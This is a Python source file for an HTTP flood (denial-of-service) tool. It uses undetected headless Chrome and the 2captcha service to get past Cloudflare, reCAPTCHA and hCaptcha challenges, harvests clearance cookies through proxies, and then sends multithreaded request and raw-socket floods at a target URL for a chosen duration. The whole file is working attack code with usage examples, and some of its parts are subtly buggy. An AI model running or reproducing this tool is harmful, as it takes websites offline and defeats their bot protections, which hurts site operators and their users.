# -*- coding: utf-8 -*-
import sys
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
#from selenium import webdriver
from selenium.webdriver.chrome.service import Service




def finished():
    print("ATTACK FINISHED")
    os.system("sudo killall python3")


def bypasspagepx(url, command, readproxy, csay):
    global useragent, cookieJAR, cookie, px, content, readcookie, csayac
    csayac=csay
    if command == "jsproxy":
        content='cf_clearance'
        px=readproxy
    elif command == "fluxproxy":
        content='flxid'
        px=readproxy
    elif command == "cfsocket":
        content='cf_clearance'
        px=readproxy
    elif command == "recappx":
        content='cf_clearance'
        px=readproxy
    elif command == "hcappx":
        content='cf_clearance'
        px=readproxy

    if command == "recappx":
        if bpt(url, command, readproxy, csay):
            time.sleep(1)
        else:
            pass
    if command == "hcappx":
        if bpt(url, command, readproxy, csay):
            time.sleep(1)
        else:
            pass
    print("Getting Cookie To Proxies {}".format(px))
    options=webdriver.ChromeOptions()
    arguments=[
        '--no-sandbox', '--disable-setuid-sandbox', f'--proxy-server=' + px, '--disable-infobars', '--disable-logging',
        '--disable-dev-shm-usage', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
        options.add_argument('--log-level=1')


    driver=webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(15):
        cookies=driver.get_cookies()
        inc=0
        for i in cookies:
            if i['name'] == content:
                cookieJAR=driver.get_cookies()[inc]
                useragent=driver.execute_script("return navigator.userAgent")
                cookie=f"{cookieJAR['name']}={cookieJAR['value']}"
                print(cookie)
                driver.quit()
                if command == "cfsocket":
                    cookielist[csayac]=cookie
                    readcookie=cookielist[csayac]
                else:
                    cookielist[csayac]=cookieJAR['value']
                    readcookie=cookielist[csayac]
                return True
            else:
                inc+=1
                pass
        time.sleep(1)
    driver.quit()
    return False


def bpt(url, command, readproxy, csay):
    global useragent, cookie, px, csayac, cookieJAR1, content1, readcookie1
    csayac=csay
    content1="cf_clearance"
    px=readproxy
    options=webdriver.ChromeOptions()
    if command == "recappx":
        arguments=[
            '--no-sandbox', '--disable-setuid-sandbox', f'--proxy-server=' + px, '--disable-infobars',
            '--disable-logging', '--disable-dev-shm-usage', '--disable-login-animations',
            '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
            '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
        ]
    else:
        arguments=[
            '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
            '--disable-dev-shm-usage', '--disable-login-animations',
            '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
            '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
        ]

    for argument in arguments:
        options.add_argument(argument)
        options.add_argument('--log-level=1')



    #path = Service('chromedriver.exe')
    driver=webdriver.Chrome( options=options)
    driver.implicitly_wait(3)
    
          ###########reCaptcha_solver###########
    if command == "recappx" or command == "recap":
        print("Bypassing ReCAPTCHA")
        API_KEY="paste your api key here"
        
        data_sitekey='paste your site key here'
        page_url=url
        driver.get(page_url)
        api=f"https://2captcha.com/in.php?key={API_KEY}&method=userrecaptcha&googlekey={data_sitekey}&pageurl={page_url}&json=1&invisible=1"
        apiget=requests.get(api)
        print(apiget.json())
        rid=apiget.json().get("request")
        u2=f"https://2captcha.com/res.php?key={API_KEY}&action=get&id={rid}&json=1"
        time.sleep(3)
        while True:
            r2=requests.get(u2)
            print(r2.json())
            if r2.json().get("status") == 1:
                TOKEN_FROM_2CAPTCHA=r2.json().get("request")
                break
            time.sleep(5)
        token=f'document.getElementById("g-recaptcha-response").innerHTML="{TOKEN_FROM_2CAPTCHA}";'
        submit='document.getElementById("recaptcha-verify-button");'

        driver.execute_script(token)
        time.sleep(3)
        driver.execute_script(submit)
        time.sleep(10)

    driver.get(url)
    for _ in range(15):
        cookies=driver.get_cookies()
        inc=0
        for i in cookies:
            if i['name'] == content1:
                cookieJAR1=driver.get_cookies()[inc]
                useragent=driver.execute_script("return navigator.userAgent")
                cookie=f"{cookieJAR1['name']}={cookieJAR1['value']}"
                print(cookie)
                driver.quit()
                if command == "recap":
                    return True
                elif command == "recappx":
                    cookielist1[csayac]=cookieJAR1['value']
                    readcookie1=cookielist1[csayac]
                    return True
            else:
                inc+=1
                pass
        time.sleep(1)
        ################____hcaptcha_solver___#######################
    if command == "hcappx" or command == "hecap":
        print("Bypassing HCAPTCHA")
        API_KEY="paste your api key from 2captcha"
        
        data_sitekey='paste your site key'
       
        page_url=url
        driver.get(page_url)
        api=f"https://2captcha.com/in.php?key={API_KEY}&method=hcaptcha&sitekey={data_sitekey}&pageurl={page_url}&json=1&invisible=1"
        apiget=requests.get(api)
        print(apiget.json())
        rid=apiget.json().get("request")
        u2=f"https://2captcha.com/res.php?key={API_KEY}&action=get&id={rid}&json=1"
        time.sleep(3)
        while True:
            r2=requests.get(u2)
            print(r2.json())
            if r2.json().get("status") == 1:
                TOKEN_FROM_2CAPTCHA=r2.json().get("request")
                break
            time.sleep(5)
        token=f'document.getElementsByName("h-captcha-response").innerHTML="{TOKEN_FROM_2CAPTCHA}";'
        submit='document.getElementById("submit");'

        driver.execute_script(token)
        time.sleep(3)
        driver.execute_script(submit)
        time.sleep(10)

    driver.get(url)
    for _ in range(15):
        cookies=driver.get_cookies()
        inc=0
        for i in cookies:
            if i['name'] == content1:
                cookieJAR1=driver.get_cookies()[inc]
                useragent=driver.execute_script("return navigator.userAgent")
                cookie=f"{cookieJAR1['name']}={cookieJAR1['value']}"
                print(cookie)
                driver.quit()
                if command == "hcap":
                    return True
                elif command == "hcappx":
                    cookielist1[csayac]=cookieJAR1['value']
                    readcookie1=cookielist1[csayac]
                    return True
            else:
                inc+=1
                pass
        time.sleep(1)

















def countdown(t):
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() < 100:
            print("ATTACK FINISHED")
            os.system("sudo killall python3")


def bypasspage(url):
    global useragent, cookieJAR1, cookie, content
    if command == "js":
        content='cf_clearance'
    elif command == "flux":
        content='flxid'
    elif command == "recap":
        content='cf_clearance'
        global readproxy, csay

    csay=0
    readproxy=""  # bpt fonksiyonuna boş gitmemesi için.
    if command == "recap":
        if bpt(url, command, readproxy, csay):
            time.sleep(1)
        else:
            pass
    return True


def start_time():
    target, thread, t=getcommands()
    timer=threading.Thread(target=countdown, args=(t,))
    timer.start()


def proxy(command):
    global proxies, proxycount, sayac, liste, cookielist, pxlist, readproxy, csay, cookielist1
    cookielist1=["", "", "", "", ""]
    cookielist=["", "", "", "", ""]
    if command == "jsproxy":
        print("GETTING 5 PROXY FROM PROXY FILE")
    elif command == "recappx":
        print("GETTING 3 PROXY FROM PROXY FILE")
    elif command == "cfsocket":
        print("GETTING 3 PROXY FROM PROXY FILE")
    elif command == "hcappx":
        print("GETTING 3 PROXY FROM PROXY FILE")
    sayac=0
    csay=0
    readproxy=""
    proxies=open("./" + str(sys.argv[5]), 'r').read().split('\n')


    proxycount=len(open("./" + str(sys.argv[5]), 'r').readlines())
    liste=["", "", "", "", ""]
    if command == "cfsocket":
        for say in range(3):
            pxlist=str(random.choice(list(proxies)))
            liste[sayac]=pxlist
            readproxy=liste[sayac]
            if bypasspagepx(target, command, readproxy, csay):
                time.sleep(1)
            csay+=1
            sayac=sayac + 1
            if sayac == 3:
                start_attackpx()
    elif command == "jsproxy" or command == "fluxproxy":
        for say in range(5):
            pxlist=str(random.choice(list(proxies)))
            liste[sayac]=pxlist
            readproxy=liste[sayac]
            if bypasspagepx(target, command, readproxy, csay):
                time.sleep(1)
            csay+=1
            sayac=sayac + 1
            if sayac == 5:
                start_attackpx()
    elif command == "recappx":
        for say in range(3):
            pxlist=str(random.choice(list(proxies)))
            liste[sayac]=pxlist
            readproxy=liste[sayac]
            if bypasspagepx(target, command, readproxy, csay):
                time.sleep(1)
            csay+=1
            sayac=sayac + 1
            if sayac == 3:
                start_attackpx()


    elif command == "hcappx":
        for say in range(3):
            pxlist=str(random.choice(list(proxies)))
            liste[sayac]=pxlist
            readproxy=liste[sayac]
            if bypasspagepx(target, command, readproxy, csay):
                time.sleep(1)
            csay+=1
            sayac=sayac + 1
            if sayac == 3:
                start_attackpx()
    return True


def listproxies():
    global proxies
    proxies=open("./" + str(sys.argv[5]), 'r').read().split('\n')
    return True


def getcommands():
    global target, thread, t
    target=str(sys.argv[1])
    thread=str(sys.argv[2])
    t=str(sys.argv[3])
    return target, thread, t


def url_replace(url):
    url=url.rstrip()
    target={}
    target['uri']=urlparse(url).path
    if target['uri'] == "":
        target['uri']="/"
    target['host']=urlparse(url).netloc
    target['scheme']=urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port']=urlparse(url).netloc.split(":")[1]
    else:
        target['port']="443" if urlparse(url).scheme == "https" else "80"
        pass
    return target


def start_attackpx():
    psayac=0
    csayac=0
    if command == "jsproxy" or command == "fluxproxy":
        for sayi in range(5):
            pxattack=liste[psayac]
            px=pxattack
            readcookie=cookielist[csayac]
            if readcookie == "1" or len(readcookie) == 0:
                print("Failed Get Cookie To Proxy : {} ".format(px))
                psayac+=1
                csayac+=1
            else:
                JSBypasspx(target, thread, t, px, readcookie)
                time.sleep(1)
                psayac+=1
                csayac+=1
        if csayac == 5:
            start_time()
    elif command == "recappx":
        for sayi in range(3):
            pxattack=liste[psayac]
            px=pxattack
            readcookie=cookielist[csayac]
            readcookie1=cookielist1[csayac]
            if readcookie == "1" or len(readcookie) == 0:
                print("Failed Get Cookie To Proxy : {} ".format(px))
                psayac+=1
                csayac+=1
            else:
                JSBypasspxre(target, thread, t, px, readcookie, readcookie1)
                time.sleep(1)
                psayac+=1
                csayac+=1
        if csayac == 3:
            start_time()
    elif command == "cfsocket":
        for sayi in range(3):
            pxattack=liste[psayac]
            px=pxattack
            readcookie=cookielist[csayac]
            if readcookie == "1" or len(readcookie) == 0:
                print("Failed Get Cookie To Proxy : {} ".format(px))
                psayac+=1
                csayac+=1
            else:
                cfsocket(target, thread, t, px, readcookie)
                time.sleep(1)
                psayac+=1
                csayac+=1
        if csayac == 3:
            start_time()

    elif command == "hcappx":
        for sayi in range(3):
            pxattack=liste[psayac]
            px=pxattack
            readcookie=cookielist[csayac]
            readcookie1=cookielist1[csayac]
            if readcookie == "1" or len(readcookie) == 0:
                print("Failed Get Cookie To Proxy : {} ".format(px))
                psayac+=1
                csayac+=1

            else:
                JSBypasspxre(target, thread, t, px, readcookie, readcookie1)
                time.sleep(1)
                psayac+=1
                csayac+=1
        if csayac == 3:
            start_time()

def JSBypass(url, th, t):
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session=requests.Session()
    scraper=cloudscraper.create_scraper(sess=session)
    jar=RequestsCookieJar()
    jar.set(cookieJAR1['name'], cookieJAR1['value'])
    scraper.cookies=jar
    for _ in range(int(th)):
        try:
            thd=threading.Thread(target=JSAttack, args=(url, until, scraper))
            thd.start()
        except:
            pass







def JSBypassre(url, th, t):
    global useragent, cookieJAR1, cookie
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session=requests.Session()
    scraper=cloudscraper.create_scraper(sess=session)
    jar=RequestsCookieJar()
    options=webdriver.ChromeOptions()
    driver=webdriver.Chrome(options=options)
    driver.get(url)
    for _ in range(15):
        cookies=driver.get_cookies()
        inc=0
        for i in cookies:
            if i['name'] == content1:
                cookieJAR1=driver.get_cookies()[inc]
                useragent=driver.execute_script("return navigator.userAgent")
                cookie=f"{cookieJAR1['name']}={cookieJAR1['value']}"
                print(cookie)
                jar.set(cookieJAR1['name'], cookieJAR1['value'])
                scraper.cookies=jar
                for _ in range(int(th)):
                    try:
                        thd=threading.Thread(target=JSAttack, args=(url, until, scraper))
                        thd.start()
                    except:
                        pass


def JSAttack(url, until_datetime, scraper):
    headers={
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass


def JSBypasspx(url, th, t, px, readcookie):
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session=requests.Session()
    scraper=cloudscraper.create_scraper(sess=session)
    jar=RequestsCookieJar()
    jar.set(cookieJAR['name'], readcookie)
    jar.set(cookieJAR1['name'], readcookie1)
    scraper.cookies=jar
    print("Attack starting With {} {}".format(px, readcookie))
    for _ in range(int(th)):
        try:
            thd=threading.Thread(target=JSAttackpx, args=(url, until, scraper, px))
            thd.start()
        except:
            pass


def JSBypasspxre(url, th, t, px, readcookie, readcookie1):
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session=requests.Session()
    scraper=cloudscraper.create_scraper(sess=session)
    jar=RequestsCookieJar()
    jar.set(cookieJAR['name'], readcookie)
    jar.set(cookieJAR1['name'], readcookie1)
    scraper.cookies=jar
    print("Attack starting With {} {}".format(px, readcookie))
    for _ in range(int(th)):
        try:
            thd=threading.Thread(target=JSAttackpx, args=(url, until, scraper, px))
            thd.start()
        except:
            pass


def JSAttackpx(url, until_datetime, scraper, px):
    headers={
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy={
                'http': 'http://'+px,
                'https': 'https://'+px,
            }
            scraper.get(url=url, headers=headers, allow_redirects=False, proxies=proxy)
            scraper.get(url=url, headers=headers, allow_redirects=False, proxies=proxy)
            requests.post(url=url, headers=headers, allow_redirects=False, proxies=proxy)
        except:
            pass


def CF(url, th, t):
    print("Attack starting !")
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper=cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd=threading.Thread(target=StartCF, args=(url, until, scraper))
            thd.start()
        except:
            pass


def StartCF(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass


def CFpx(url, th, t):
    print("Attack starting !")
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper=cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd=threading.Thread(target=StartCFpx, args=(url, until, scraper))
            thd.start()
        except:
            pass


def StartCFpx(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy={
                'http': 'http://' + str(random.choice(list(proxies))),
                'https': 'https://' + str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass


def cfsocket(url, th, t, px, readcookie):
    print("Starting")
    cookie=readcookie
    print(cookie)
    print(px)
    until=datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target=url_replace(url)
    req='GET ' + target['url'] + ' HTTP/1.1\r\n'
    req+='Host: ' + target['host'] + '\r\n'
    req+='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req+='Accept-Encoding: gzip, deflate, br\r\n'
    req+='Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req+='Cache-Control: max-age=0\r\n'
    req+='Cookie: ' + cookie + '\r\n'
    req+=f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req+='sec-ch-ua-mobile: ?0\r\n'
    req+='sec-ch-ua-platform: "Windows"\r\n'
    req+='sec-fetch-dest: empty\r\n'
    req+='sec-fetch-mode: cors\r\n'
    req+='sec-fetch-site: same-origin\r\n'
    req+='Connection: Keep-Alive\r\n'
    req+='User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd=threading.Thread(target=CfsocketAttack, args=(until, target, req, px))
            thd.start()
        except:
            pass


def CfsocketAttack(until_datetime, target, req, px):
    px=px.strip().split(":")
    if target['scheme'] == 'https':
        packet=socks.socksocket()
        packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet=ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet=socks.socksocket()
        packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


def usage():
    print("METHODS : ")
    print("hcappx: Bypass Cloudflare UAM/HCAPTCHA Page With http/s Proxy")
    print("js : Bypassing Cloudflare UAM/HCAPTCHA Page Without Proxy")
    print("jsproxy : Bypassing Cloudflare UAM/HCAPTCHA Page With http/s Proxy")
    print("cf : Bypassing Default Cloudflare Page Without Proxy")
    print("cfproxy : Bypassing Default Cloudflare Page With http/s Proxy")
    print("flux : Bypassing Flux UAM Page Wihout Proxy")
    print("fluxproxy : Bypassing Flux UAM Page With http/s Proxy")
    print("recappx: Bypass Cloudflare RECAPTCHA Page With http/s Proxy")
    print()
    print("python3 main.py url thread time method")
    print("Example : python3 main.py https://url.com 300 60 js")
    print()
    print("python3 main.py url thread time method proxy.txt")
    print("Example : python main.py https://test02.lol 300 60 cfsocket proxy.txt")
    print("Example : python main.py https://test02.lol 300 60 recappx proxy.txt")
    print("Example : python main.py https://2captcha.com/demo/hcaptcha?difficulty=easy 300 60 hcappx proxy.txt")
    exit()


def Fluxbypass(target, thread, t):
    pass


def command():
    global psayac, command, timer
    psayac=0
    command=str(sys.argv[4])
    if command == "js":
        target, thread, t=getcommands()
        if bypasspage(target):
            timer=threading.Thread(target=countdown, args=(t,))
            timer.start()
            JSBypass(target, thread, t)
            timer.join()
    if command == "hcap":
        target, thread, t=getcommands()
        if bypasspage(target):
            timer=threading.Thread(target=countdown, args=(t,))
            timer.start()
            JSBypassre(target, thread, t)
            timer.join()


    if command == "recap":
        target, thread, t=getcommands()
        if bypasspage(target):
            timer=threading.Thread(target=countdown, args=(t,))
            timer.start()
            JSBypassre(target, thread, t)
            timer.join()
    elif command == "cf":
        target, thread, t=getcommands()
        start_time()
        CF(target, thread, t)
        timer.join()
    elif command == "jsproxy" and len(sys.argv) >= int(5):
        getcommands()
        proxy(command)
    elif command == "recappx" and len(sys.argv) >= int(5):
        getcommands()
        proxy(command)
    elif command == "hcappx" and len(sys.argv) >= int(5):
        getcommands()
        proxy(command)
    elif command == "cfproxy":
        target, thread, t=getcommands()
        listproxies()
        start_time()
        CFpx(target, thread, t)
    elif command == "flux":
        target, thread, t=getcommands()
        if bypasspage(target):
            timer=threading.Thread(target=countdown, args=(t,))
            timer.start()
            Fluxbypass(target, thread, t)
            timer.join()
    elif command == "fluxproxy" and len(sys.argv) >= int(5):
        getcommands()
        proxy(command)
    elif command == "cfsocket":
        t=getcommands()
        proxy(command)
    else:
        print("Wrong method type...")
        usage()


if __name__ == '__main__':
    if len(sys.argv) < int(4):
        usage()
    else:
        command()
